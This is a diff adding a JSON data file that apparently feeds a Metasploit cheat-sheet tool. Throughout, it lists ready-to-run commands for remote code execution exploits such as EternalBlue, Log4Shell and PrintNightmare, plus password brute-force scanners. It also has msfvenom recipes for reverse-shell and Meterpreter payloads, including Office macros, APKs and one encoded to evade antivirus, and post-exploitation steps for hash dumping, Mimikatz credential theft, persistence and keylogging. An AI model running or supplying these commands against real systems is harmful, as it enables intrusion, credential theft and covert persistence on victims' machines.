@@ -1,0 +1,97 @@
+{
+  "categories": [
+    {
+      "name":"Exploits","type":"exploit","modules":[
+        {"name":"EternalBlue","path":"exploit/windows/smb/ms17_010_eternalblue","desc":"MS17-010 SMB Remote Code Execution","options":["RHOSTS","RPORT 445","LHOST","LPORT"],"usage":"use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS target\nset LHOST attacker\nexploit"},
+        {"name":"Apache Struts RCE","path":"exploit/multi/http/struts2_content_type_ognl","desc":"Apache Struts 2 Jakarta Multipart Parser OGNL Injection","options":["RHOSTS","RPORT","TARGETURI","LHOST"],"usage":"use exploit/multi/http/struts2_content_type_ognl\nset RHOSTS target\nset TARGETURI /struts2-showcase/\nexploit"},
+        {"name":"Tomcat Manager Upload","path":"exploit/multi/http/tomcat_mgr_upload","desc":"Apache Tomcat Manager Application WAR Upload","options":["RHOSTS","RPORT","HttpUsername","HttpPassword","LHOST"],"usage":"use exploit/multi/http/tomcat_mgr_upload\nset RHOSTS target\nset HttpUsername tomcat\nset HttpPassword s3cret\nexploit"},
+        {"name":"vsftpd Backdoor","path":"exploit/unix/ftp/vsftpd_234_backdoor","desc":"VSFTPD 2.3.4 Backdoor Command Execution","options":["RHOSTS","RPORT 21"],"usage":"use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS target\nexploit"},
+        {"name":"UnrealIRCd Backdoor","path":"exploit/unix/irc/unreal_ircd_3281_backdoor","desc":"UnrealIRCd 3.2.8.1 Backdoor Command Execution","options":["RHOSTS","RPORT 6667"],"usage":"use exploit/unix/irc/unreal_ircd_3281_backdoor\nset RHOSTS target\nexploit"},
+        {"name":"Samba Usermap","path":"exploit/multi/samba/usermap_script","desc":"Samba username map script Command Execution","options":["RHOSTS","RPORT 139","LHOST"],"usage":"use exploit/multi/samba/usermap_script\nset RHOSTS target\nexploit"},
+        {"name":"PHP CGI Argument Injection","path":"exploit/multi/http/php_cgi_arg_injection","desc":"PHP CGI Argument Injection","options":["RHOSTS","RPORT","LHOST"],"usage":"use exploit/multi/http/php_cgi_arg_injection\nset RHOSTS target\nexploit"},
+        {"name":"Drupalgeddon2","path":"exploit/unix/webapp/drupal_drupalgeddon2","desc":"Drupal Remote Code Execution (SA-CORE-2018-002)","options":["RHOSTS","RPORT","TARGETURI","LHOST"],"usage":"use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS target\nset TARGETURI /\nexploit"},
+        {"name":"Jenkins Script Console","path":"exploit/multi/http/jenkins_script_console","desc":"Jenkins Script Console Command Execution","options":["RHOSTS","RPORT","TARGETURI","LHOST"],"usage":"use exploit/multi/http/jenkins_script_console\nset RHOSTS target\nexploit"},
+        {"name":"Log4Shell","path":"exploit/multi/http/log4shell_header_injection","desc":"Apache Log4j RCE (CVE-2021-44228)","options":["RHOSTS","RPORT","HTTP_HEADER","LHOST"],"usage":"use exploit/multi/http/log4shell_header_injection\nset RHOSTS target\nset HTTP_HEADER User-Agent\nexploit"},
+        {"name":"ProFTPd Backdoor","path":"exploit/unix/ftp/proftpd_133c_backdoor","desc":"ProFTPd 1.3.3c Backdoor Command Execution","options":["RHOSTS","RPORT 21"],"usage":"use exploit/unix/ftp/proftpd_133c_backdoor\nset RHOSTS target\nexploit"},
+        {"name":"Java RMI","path":"exploit/multi/misc/java_rmi_server","desc":"Java RMI Server Insecure Default Configuration","options":["RHOSTS","RPORT 1099","LHOST"],"usage":"use exploit/multi/misc/java_rmi_server\nset RHOSTS target\nexploit"},
+        {"name":"Rejetto HFS","path":"exploit/windows/http/rejetto_hfs_exec","desc":"Rejetto HttpFileServer Remote Command Execution","options":["RHOSTS","RPORT","LHOST"],"usage":"use exploit/windows/http/rejetto_hfs_exec\nset RHOSTS target\nset RPORT 8080\nexploit"},
+        {"name":"BlueKeep","path":"exploit/windows/rdp/cve_2019_0708_bluekeep_rce","desc":"CVE-2019-0708 BlueKeep RDP Remote Code Execution","options":["RHOSTS","RPORT 3389","TARGET"],"usage":"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS target\nset TARGET 2\nexploit"},
+        {"name":"PrintNightmare","path":"exploit/windows/dcerpc/cve_2021_1675_printnightmare","desc":"CVE-2021-1675 Print Spooler RCE","options":["RHOSTS","SMBUser","SMBPass","LHOST"],"usage":"use exploit/windows/dcerpc/cve_2021_1675_printnightmare\nset RHOSTS target\nset SMBUser user\nset SMBPass pass\nexploit"},
+        {"name":"Shellshock","path":"exploit/multi/http/apache_mod_cgi_bash_env_exec","desc":"Apache mod_cgi Bash Environment Variable Injection","options":["RHOSTS","RPORT","TARGETURI","LHOST"],"usage":"use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS target\nset TARGETURI /cgi-bin/status\nexploit"},
+        {"name":"Webmin RCE","path":"exploit/linux/http/webmin_backdoor","desc":"Webmin 1.890-1.920 RCE","options":["RHOSTS","RPORT 10000","SSL","LHOST"],"usage":"use exploit/linux/http/webmin_backdoor\nset RHOSTS target\nset SSL true\nexploit"},
+        {"name":"WordPress Admin Shell Upload","path":"exploit/unix/webapp/wp_admin_shell_upload","desc":"WordPress Admin Shell Upload","options":["RHOSTS","USERNAME","PASSWORD","LHOST"],"usage":"use exploit/unix/webapp/wp_admin_shell_upload\nset RHOSTS target\nset USERNAME admin\nset PASSWORD password\nexploit"}
+      ]
+    },
+    {
+      "name":"Auxiliary","type":"auxiliary","modules":[
+        {"name":"SMB Version Scanner","path":"auxiliary/scanner/smb/smb_version","desc":"SMB Version Detection","options":["RHOSTS","THREADS"],"usage":"use auxiliary/scanner/smb/smb_version\nset RHOSTS 192.168.1.0/24\nrun"},
+        {"name":"SMB Login","path":"auxiliary/scanner/smb/smb_login","desc":"SMB Login Checker","options":["RHOSTS","SMBUser","SMBPass","PASS_FILE"],"usage":"use auxiliary/scanner/smb/smb_login\nset RHOSTS target\nset SMBUser admin\nset PASS_FILE /usr/share/wordlists/rockyou.txt\nrun"},
+        {"name":"SSH Login","path":"auxiliary/scanner/ssh/ssh_login","desc":"SSH Login Checker","options":["RHOSTS","USERNAME","PASS_FILE","THREADS"],"usage":"use auxiliary/scanner/ssh/ssh_login\nset RHOSTS target\nset USERNAME root\nset PASS_FILE wordlist.txt\nrun"},
+        {"name":"FTP Login","path":"auxiliary/scanner/ftp/ftp_login","desc":"FTP Authentication Scanner","options":["RHOSTS","USER_FILE","PASS_FILE"],"usage":"use auxiliary/scanner/ftp/ftp_login\nset RHOSTS target\nrun"},
+        {"name":"HTTP Directory Scanner","path":"auxiliary/scanner/http/dir_scanner","desc":"HTTP Directory Scanner","options":["RHOSTS","RPORT","THREADS"],"usage":"use auxiliary/scanner/http/dir_scanner\nset RHOSTS target\nrun"},
+        {"name":"MySQL Login","path":"auxiliary/scanner/mysql/mysql_login","desc":"MySQL Login Utility","options":["RHOSTS","USERNAME","PASS_FILE"],"usage":"use auxiliary/scanner/mysql/mysql_login\nset RHOSTS target\nset USERNAME root\nrun"},
+        {"name":"SNMP Community Scanner","path":"auxiliary/scanner/snmp/snmp_login","desc":"SNMP Community String Scanner","options":["RHOSTS","THREADS"],"usage":"use auxiliary/scanner/snmp/snmp_login\nset RHOSTS 192.168.1.0/24\nrun"},
+        {"name":"VNC None Auth","path":"auxiliary/scanner/vnc/vnc_none_auth","desc":"VNC Authentication None Detection","options":["RHOSTS","THREADS"],"usage":"use auxiliary/scanner/vnc/vnc_none_auth\nset RHOSTS target\nrun"},
+        {"name":"DNS Enum","path":"auxiliary/gather/dns_bruteforce","desc":"DNS Bruteforce Enumeration","options":["DOMAIN","WORDLIST"],"usage":"use auxiliary/gather/dns_bruteforce\nset DOMAIN target.com\nrun"},
+        {"name":"TCP Port Scanner","path":"auxiliary/scanner/portscan/tcp","desc":"TCP Port Scanner","options":["RHOSTS","PORTS","THREADS"],"usage":"use auxiliary/scanner/portscan/tcp\nset RHOSTS target\nset PORTS 1-10000\nrun"},
+        {"name":"SYN Port Scanner","path":"auxiliary/scanner/portscan/syn","desc":"TCP SYN Port Scanner","options":["RHOSTS","PORTS","THREADS"],"usage":"use auxiliary/scanner/portscan/syn\nset RHOSTS target\nset PORTS 1-65535\nrun"},
+        {"name":"MSSQL Login","path":"auxiliary/scanner/mssql/mssql_login","desc":"MSSQL Login Utility","options":["RHOSTS","USERNAME","PASSWORD"],"usage":"use auxiliary/scanner/mssql/mssql_login\nset RHOSTS target\nset USERNAME sa\nrun"},
+        {"name":"HTTP Title","path":"auxiliary/scanner/http/title","desc":"HTTP HTML Title Headers","options":["RHOSTS","RPORT","THREADS"],"usage":"use auxiliary/scanner/http/title\nset RHOSTS file:targets.txt\nrun"},
+        {"name":"RDP Scanner","path":"auxiliary/scanner/rdp/rdp_scanner","desc":"RDP Service Scanner","options":["RHOSTS","RPORT 3389"],"usage":"use auxiliary/scanner/rdp/rdp_scanner\nset RHOSTS 192.168.1.0/24\nrun"},
+        {"name":"SMTP Enum","path":"auxiliary/scanner/smtp/smtp_enum","desc":"SMTP User Enumeration","options":["RHOSTS","USER_FILE"],"usage":"use auxiliary/scanner/smtp/smtp_enum\nset RHOSTS target\nset USER_FILE /usr/share/wordlists/unix_users.txt\nrun"}
+      ]
+    },
+    {
+      "name":"Payloads","type":"payload","modules":[
+        {"name":"Windows Meterpreter Reverse TCP","path":"windows/x64/meterpreter/reverse_tcp","desc":"x64 Meterpreter reverse TCP stager","options":["LHOST","LPORT"],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f exe > shell.exe"},
+        {"name":"Windows Meterpreter Reverse HTTPS","path":"windows/x64/meterpreter/reverse_https","desc":"x64 Meterpreter reverse HTTPS stager","options":["LHOST","LPORT"],"usage":"msfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=443 -f exe > shell.exe"},
+        {"name":"Linux Meterpreter Reverse TCP","path":"linux/x64/meterpreter/reverse_tcp","desc":"x64 Linux Meterpreter reverse TCP","options":["LHOST","LPORT"],"usage":"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f elf > shell.elf"},
+        {"name":"Linux Shell Reverse TCP","path":"linux/x64/shell_reverse_tcp","desc":"x64 Linux shell reverse TCP","options":["LHOST","LPORT"],"usage":"msfvenom -p linux/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f elf > shell.elf"},
+        {"name":"PHP Meterpreter Reverse TCP","path":"php/meterpreter/reverse_tcp","desc":"PHP Meterpreter reverse TCP","options":["LHOST","LPORT"],"usage":"msfvenom -p php/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f raw > shell.php"},
+        {"name":"Python Reverse TCP","path":"python/meterpreter/reverse_tcp","desc":"Python Meterpreter reverse TCP","options":["LHOST","LPORT"],"usage":"msfvenom -p python/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f raw > shell.py"},
+        {"name":"Java JSP Shell","path":"java/jsp_shell_reverse_tcp","desc":"Java JSP shell reverse TCP (WAR)","options":["LHOST","LPORT"],"usage":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=4444 -f war > shell.war"},
+        {"name":"ASP Meterpreter Reverse TCP","path":"windows/meterpreter/reverse_tcp","desc":"x86 Windows Meterpreter (ASP)","options":["LHOST","LPORT"],"usage":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=4444 -f asp > shell.asp"},
+        {"name":"Windows Shell Reverse TCP","path":"windows/x64/shell_reverse_tcp","desc":"x64 Windows command shell","options":["LHOST","LPORT"],"usage":"msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f exe > shell.exe"},
+        {"name":"PowerShell Reverse TCP","path":"cmd/windows/reverse_powershell","desc":"Windows PowerShell reverse shell","options":["LHOST","LPORT"],"usage":"msfvenom -p cmd/windows/reverse_powershell LHOST=ip LPORT=4444 -f raw"}
+      ]
+    },
+    {
+      "name":"Post-Exploitation","type":"post","modules":[
+        {"name":"Hashdump","path":"post/windows/gather/hashdump","desc":"Dump Windows password hashes","options":["SESSION"],"usage":"use post/windows/gather/hashdump\nset SESSION 1\nrun"},
+        {"name":"Mimikatz","path":"post/windows/gather/credentials/mimikatz","desc":"Extract credentials with Mimikatz","options":["SESSION"],"usage":"load kiwi\ncreds_all\nlsa_dump_secrets"},
+        {"name":"Smart Hashdump","path":"post/windows/gather/smart_hashdump","desc":"Smart password hash dump","options":["SESSION","GETSYSTEM"],"usage":"use post/windows/gather/smart_hashdump\nset SESSION 1\nrun"},
+        {"name":"Enum Applications","path":"post/windows/gather/enum_applications","desc":"Enumerate installed applications","options":["SESSION"],"usage":"use post/windows/gather/enum_applications\nset SESSION 1\nrun"},
+        {"name":"CheckVM","path":"post/windows/gather/checkvm","desc":"Check if target is a virtual machine","options":["SESSION"],"usage":"use post/windows/gather/checkvm\nset SESSION 1\nrun"},
+        {"name":"Enum Shares","path":"post/windows/gather/enum_shares","desc":"Enumerate Windows shares","options":["SESSION"],"usage":"use post/windows/gather/enum_shares\nset SESSION 1\nrun"},
+        {"name":"Enum Logged On Users","path":"post/windows/gather/enum_logged_on_users","desc":"List currently logged on users","options":["SESSION"],"usage":"use post/windows/gather/enum_logged_on_users\nset SESSION 1\nrun"},
+        {"name":"Suggest Local Exploits","path":"post/multi/recon/local_exploit_suggester","desc":"Suggest local privilege escalation exploits","options":["SESSION"],"usage":"use post/multi/recon/local_exploit_suggester\nset SESSION 1\nrun"},
+        {"name":"Autoroute","path":"post/multi/manage/autoroute","desc":"Add route for pivoting through session","options":["SESSION","SUBNET"],"usage":"use post/multi/manage/autoroute\nset SESSION 1\nset SUBNET 10.10.10.0\nrun"},
+        {"name":"Linux Enum System","path":"post/linux/gather/enum_system","desc":"Enumerate Linux system information","options":["SESSION"],"usage":"use post/linux/gather/enum_system\nset SESSION 1\nrun"},
+        {"name":"Persistence Registry","path":"exploit/windows/local/persistence","desc":"Install registry persistence","options":["SESSION","LHOST","LPORT"],"usage":"use exploit/windows/local/persistence\nset SESSION 1\nset LHOST attacker\nrun"},
+        {"name":"Token Impersonation","path":"incognito","desc":"Token impersonation with Incognito","options":[],"usage":"use incognito\nlist_tokens -u\nimpersonate_token 'DOMAIN\\\\Admin'"},
+        {"name":"Port Forward","path":"portfwd","desc":"Port forwarding through Meterpreter","options":[],"usage":"portfwd add -l 8080 -p 80 -r target_internal\nportfwd list\nportfwd delete -l 8080"},
+        {"name":"Keylogger","path":"keyscan","desc":"Capture keystrokes on target","options":[],"usage":"keyscan_start\nkeyscan_dump\nkeyscan_stop"},
+        {"name":"Screenshot","path":"screenshot","desc":"Capture target desktop screenshot","options":[],"usage":"screenshot\nscreenshare"}
+      ]
+    },
+    {
+      "name":"MSFvenom Cheatsheet","type":"msfvenom","modules":[
+        {"name":"Windows x64 EXE","path":"","desc":"Stageless Meterpreter EXE","options":[],"usage":"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell.exe"},
+        {"name":"Windows x64 EXE (Encoded)","path":"","desc":"Encoded to avoid basic AV","options":[],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -e x64/xor_dynamic -i 5 -f exe -o shell.exe"},
+        {"name":"Linux ELF","path":"","desc":"Linux reverse shell ELF binary","options":[],"usage":"msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o shell.elf"},
+        {"name":"PHP Webshell","path":"","desc":"PHP reverse shell script","options":[],"usage":"msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -o shell.php"},
+        {"name":"Python Script","path":"","desc":"Python reverse shell payload","options":[],"usage":"msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o shell.py"},
+        {"name":"WAR File","path":"","desc":"Java WAR for Tomcat","options":[],"usage":"msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o shell.war"},
+        {"name":"ASPX Shell","path":"","desc":"ASP.NET reverse shell","options":[],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f aspx -o shell.aspx"},
+        {"name":"HTA File","path":"","desc":"HTML Application payload","options":[],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f hta-psh -o shell.hta"},
+        {"name":"VBA Macro","path":"","desc":"Office macro payload","options":[],"usage":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f vba-exe"},
+        {"name":"PowerShell Oneliner","path":"","desc":"PowerShell command payload","options":[],"usage":"msfvenom -p cmd/windows/reverse_powershell LHOST=IP LPORT=PORT -f raw"},
+        {"name":"DLL Injection","path":"","desc":"DLL payload for injection","options":[],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll -o shell.dll"},
+        {"name":"Shellcode (C)","path":"","desc":"Raw shellcode in C format","options":[],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f c"},
+        {"name":"Shellcode (Python)","path":"","desc":"Raw shellcode in Python format","options":[],"usage":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f python"},
+        {"name":"Android APK","path":"","desc":"Android Meterpreter APK","options":[],"usage":"msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -o shell.apk"},
+        {"name":"macOS Payload","path":"","desc":"macOS Meterpreter","options":[],"usage":"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f macho -o shell.macho"}
+      ]
+    }
+  ]
+}
